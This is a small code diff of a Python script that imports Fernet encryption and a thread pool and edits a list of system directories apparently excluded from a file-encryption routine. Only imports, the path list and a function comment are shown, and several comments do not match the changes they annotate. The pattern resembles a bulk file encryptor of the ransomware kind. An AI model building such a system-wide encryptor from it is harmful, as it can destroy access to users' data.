@@ -7,7 +7,7 @@ import platform
 import logging
 import signal
 import time
-import psutil
+import psutil  # New import for dynamic resource handling
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -57,12 +57,11 @@ system_paths = [
     "/var/log",
     "/dev",
     "/sys",
-    "/proc",
+    "/proc",  # Added to prevent freezing
     "/usr/lib",
     "/usr/local/python",
     "/usr/local/python3",
     "/usr/local/py-utils",
-    "/usr/local/share/nvm"
 ]
 
 # Function to encrypt a file
